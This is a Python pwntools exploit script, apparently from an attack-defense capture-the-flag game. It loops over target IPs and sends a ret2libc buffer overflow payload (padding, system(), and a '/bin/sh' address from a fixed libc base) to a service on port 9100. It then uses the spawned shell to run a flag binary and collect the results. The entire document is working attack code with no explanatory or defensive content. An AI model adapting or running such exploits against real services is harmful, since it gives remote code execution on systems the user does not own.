from pwn import *

IP_LIST = ["172.16.XXX.XX", "", ""]
flags = []

for ip in IP_LIST:
	p = remote(ip, 9100)

	libc_base = 0xf7d40000
	system = libc_base + 0x4c910
	binsh = libc_base + 0x1b5faa

	payload = b'A'*78 + p32(system) + b'b'*4 + p32(binsh)

	p.sendlineafter(b"Enter Order ID: ", payload)
	p.sendline(b'cd ../../..')
	p.sendline(b'usr/local/bin/flag')
	
	flag = p.recvall(timeout=1).strip()
	flags.append(flag.decode())

	p.close()

for i in range(len(flags)):
    print(flags[i], end=',' if (i+1) % 5 != 0 else '\n')
